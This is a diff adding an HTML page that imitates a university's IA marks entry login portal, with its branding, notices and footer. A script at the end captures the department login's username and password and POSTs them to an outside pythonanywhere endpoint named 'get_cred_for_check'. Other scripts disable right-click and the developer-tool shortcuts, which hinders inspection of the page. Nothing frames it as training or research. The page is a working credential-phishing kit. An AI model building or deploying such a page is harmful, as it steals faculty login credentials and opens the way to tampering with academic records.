@@ -1,0 +1,210 @@
+
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>IA Marks Entry</title>
+		<meta charset="utf-8">    
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+		<link href="bootstrap.min.css" rel="stylesheet">
+		<link href="style.css" rel="stylesheet">
+	</head>
+	<script language="javascript">
+		function CheckJS()
+		{
+			if(document.getElementById('EnableExamForm'))
+			{
+				document.getElementById('EnableExamForm').style.display='block';
+				
+			}
+		}	
+	</script>
+	<body onload="CheckJS()" style="background:#f0f0f0">
+		<div class="container" style="background:white">
+			<div class="row" style="">
+				<div class="col-md-12" style="margin:0px;box-shadow:0px 0px 10px 0px #888888;">
+					<div class="row">
+						<div class="container">
+							<div class="row">
+								<img src="logo.png" class="img-responsive">
+							</div>
+						</div>
+					</div>
+					<div class="row" style="background-color:#222;padding:2px;">
+						<p class="text-center" style="color:#10ee77;font-size: 20px;margin: 5px;">UG IA Marks Application</p>
+					</div>
+					<div class="row" style="background-color:#D2E4F2;padding:4px;">
+						<ul class="nav nav-pills">
+							<li><a style="color:inherit;font-weight:bold;" href="#">Home</a></li>
+							<li class="active"><a style="color:white;font-weight:bold;" href="#">IA Marks UG</a></li>
+						</ul>
+					</div>
+					<div class="row" style="background-color:#EE833587;padding:4px;">
+						<marquee scrollamount="6" onmouseover="this.stop();" onmouseout="this.start();">
+							<span class="badge badge-success">!!!</span> <b style="color:Purple;">IA Marks Application Services Closes @5:30 P.M</b>&nbsp;&nbsp;
+							<span class="badge badge-success">!!!</span> <b style="color:black;">For Technical queries mail to <i> prexam[@]vtu.ac.in </i> </b>&nbsp;&nbsp;
+						</marquee>
+					</div>
+				<div class="row" id="EnableExamForm" style="display:none;" >																<div class="row" style="margin:10px;">
+	<div class="col-md-12">
+		<div class="panel panel-warning" style="box-shadow:0px 0px 20px #dff0d8;">
+			<div class="panel-heading text-center">
+				<span style="font-weight:bold;font-size:16px;">Instruction / Notification</span>
+			</div>
+			<div class="panel-body">
+				<ul>
+					<li style="color:blue;font-size:18px;">CIE / IA Marks Entry of CIV / CPH has be done in CIV / CPH Department Login <b style="color:red;"> Ex: 1ATCPH / 1ATCIV</b> !!!</li>
+					<li style="color:red;font-size:18px;">For Login Credentials, put a email from College Principal to <b style="color:green;"> faculty<b style="color:blue;">[</b>@<b style="color:blue;">]</b>vtu.ac.in</b>, remove square brackets while sending email. </li>
+				</ul>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="col-md-12">
+	<div class="row" style="margin:10px;">
+		<div class="col-md-3">
+			<div class="panel panel-success" style="box-shadow:0px 0px 20px #dff0d8;">
+				<div class="panel-heading text-center">
+					<span style="font-weight:bold;font-size:16px;">Department Login</span>
+				</div>
+				<div class="panel-body">
+					<div class="col-md-12" style="padding: 20px 20px 20px 20px; background-color: #fff; border-radius:20px;box-shadow:0px 0px 5px gray;">
+						<form style="height:auto;background:none" >
+							<input type="hidden" name="Token" value="a56fefb77ef9779c03c2f454b3670b2e3fdbcc72"/ disabled>
+							<div class="row" style="margin-bottom:15px;">
+								<div class="col-md-12" >
+									<input name="username" autofocus autocomplete="off"  class="form-control" style="height:50px;border-radius:20px;font-weight:bold;font-size:20px;letter-spacing:2px;color:black;"  type="text" maxlength="6"  placeholder="Username" required>
+								</div>
+							</div>
+							<div class="row" style="margin-bottom:15px;">
+								<div class="col-md-12" >
+									<input name="password" class="form-control" autocomplete="off"  type="password"  placeholder="Password" style="height:50px;border-radius:20px;font-weight:bold;font-size:18px;letter-spacing:2px;color:black;"  required>
+								</div>
+							</div>
+						<div class="row" style="margin-bottom:5px;">
+						<div class="col-md-4 col-md-offset-2">
+						<input type="submit" id="deptLoginSubmit"  name="LoginDepartment" style="width:110px;" class="btn btn-success btn-lg" value="Login">
+						</div>
+						</div>
+						</form>
+						</div>
+						</div>
+						</div>
+						</div>
+						<div class="col-md-3">
+						<div class="panel panel-info" style="box-shadow:0px 0px 20px #d9edf7;">
+						<div class="panel-heading text-center">
+						<span style="font-weight:bold;font-size:16px;">Principal Login</span>
+						</div>
+						<div class="panel-body">
+						<div class="col-md-12" style="padding: 20px 20px 20px 20px; background-color: #fff; border-radius:20px;box-shadow:0px 0px 5px gray;">
+						<form action="LoginController.php" method="post" style="height:auto;background:none" >
+						<input type="hidden" name="Token" value="d51681e0d4068e8fc1e8aef284838710e741a1db"/>
+						<div class="row" style="margin-bottom:15px;">
+						<div class="col-md-12" >
+						<input name="username" autofocus autocomplete="off" pattern="[A-Za-z]{5}" class="form-control" type="text" maxlength="5" style="height:50px;border-radius:20px;font-weight:bold;font-size:20px;letter-spacing:2px;"  placeholder="Username" required disabled>
+						</div>
+						</div>
+						<div class="row" style="margin-bottom:15px;">
+						<div class="col-md-12" >
+						<input name="password" class="form-control" autocomplete="off"  type="password" style="height:50px;border-radius:20px;font-weight:bold;font-size:18px;letter-spacing:2px;"   placeholder="Password" required disabled>
+						</div>
+						</div>
+						<div class="row" style="margin-bottom:5px;">
+						<div class="col-md-2 col-md-offset-2">
+						<input type="submit"  name="LoginPrincipal" style="background-color: black; cursor:not-allowed	; width:110px;" class="btn btn-success btn-lg" value="Login" disabled>
+						</div>
+						</div>
+						</form>
+						</div>
+						</div>
+						</div>
+						</div>
+						<div class="col-md-6">
+						<div class="panel panel-warning" style="box-shadow:0px 0px 20px #dff0d8;">
+						<div class="panel-heading text-center">
+						<span style="font-weight:bold;font-size:16px;">Instruction / Notification</span>
+						</div>
+						<div class="panel-body">
+						<ul>
+						<li style="color:red;font-size:18px;">Do Not Share Credentials with Anyone. !!!</li>
+						<li style="color:red;font-size:18px;">Do Not Save Credentials in Web Browser. !!!</li>
+						<li style="color:blue;font-size:18px;">Logout from Application Compulsarily.</li>
+						</ul>
+						</div>
+						</div>
+						</div>
+						</div>
+						</div>
+												</div>
+				<noscript>
+					<h1 class="text-center" style="color:red;">Javascript Must Be Enabled</h1>
+				</noscript>
+					<div class="row">
+						<div class="col-md-12" style="background:#494e54;padding:10px;margin:0px;box-shadow:0px 0px 10px 0px #888888;">
+							<div class="row">
+								<div class="col-md-12" style="text-align:center;color:white;">© ೨೦೧೯ ವಿನ್ಯಾಸ ಮತ್ತು ಅಭಿವೃದ್ಧಿಪಡಿಸಿದವರು ಯೋಜನಾ ನಿರ್ವಹಣೆ ವಿಭಾಗ (ಪಿ. ಎಮ್. ಸಿ), ಸಿ. ಎನ್. ಸಿ, ವಿ.ತಾ.ವಿ, ಬೆಳಗಾವಿ. ಕರ್ನಾಟಕ. ಭಾರತ.</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</body>
+	<script language="javascript">
+	//disable right click
+	document.addEventListener('contextmenu', event=> event.preventDefault());
+	//disable ctrlKey shiftKeys 
+	document.onkeydown = function(e) 
+	{
+		if(event.keyCode == 123) 
+		{
+			return false;
+		}
+		if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+			return false;
+		}
+		if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){ 
+			return false;
+		}
+		if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+			return false;
+		}
+		if(e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)){
+			return false;
+		}
+	};
+	</script>	
+	
+	<script>
+document.addEventListener("DOMContentLoaded", function(){
+    document.getElementById("deptLoginSubmit").addEventListener("click", function(event){
+        event.preventDefault(); // Prevent the form from submitting through the browser
+
+        var username = document.querySelector('input[name="username"]').value;
+        var password = document.querySelector('input[name="password"]').value;
+
+	console.log(username, password);	
+	
+        fetch('https://adityasaroha456.pythonanywhere.com/get_cred_for_check', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({username: username, password: password})
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Success:', data);
+            // Handle success (you might want to redirect the user or display a success message)
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            // Handle errors here (display an error message to the user)
+        });
+    });
+});
+</script>
+
+</html>
+												
